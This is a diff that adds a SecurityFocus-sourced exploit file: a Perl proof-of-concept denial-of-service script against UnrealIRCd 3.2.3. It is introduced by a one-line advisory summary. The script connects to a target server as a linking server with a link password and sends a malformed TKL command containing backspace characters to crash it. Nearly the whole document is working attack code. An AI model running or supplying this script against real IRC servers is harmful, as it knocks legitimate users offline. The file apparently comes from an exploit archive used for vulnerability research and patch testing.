@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/17057/info
+
+UnrealIRCd is prone to a remote denial-of-service vulnerability. A remote attacker may exploit this issue to deny service for legitimate users.
+
+#!/usr/bin/perl
+
+# Denial of Service exploit for UnrealIRCd 3.2.3
+# Successfully tested on both Win32 and Linux versions.
+# admin@redneck.servebeer.com (Brandon Milner)
+
+use IO::Socket;
+print ("UnrealIRCd Server-Link Denial of Service exploit PoC by Redneck\n");
+
+#################
+#   Variables   #
+#################
+$spass = ("LinkPass");                          # Link Password
+$lserver = ("your.server.name");                # Local Server name
+$rserver = ("remote.server.name");              # Link Server
+$rport = (6667);                                # Link Port
+$snum = (6);                                    # Server numeric
+
+#################
+# Create socket #
+#################
+my $sock = new IO::Socket::INET (
+        PeerAddr => $rserver,
+        PeerPort => $rport,
+        Proto => 'tcp',
+);
+
+#################
+#    Connect    #
+#################
+die "Couldn't create socket to $rserver / $rport!\n" unless $sock;
+sleep 5;
+print ("connected to server");
+print $sock ("PASS $spass\n");
+print ("PASS $spass\n");
+print $sock ("SERVER $lserver 1 $snum :PoC by Redneck\n");
+print ("SERVER $lserver 1 $snum :PoC by Redneck\n");
+sleep 5;
+print $sock ("TKL - q\x08Q *\x08PoC\n");
+print ("TKL - q\x08Q *\x08PoC\n");
+sleep 5;
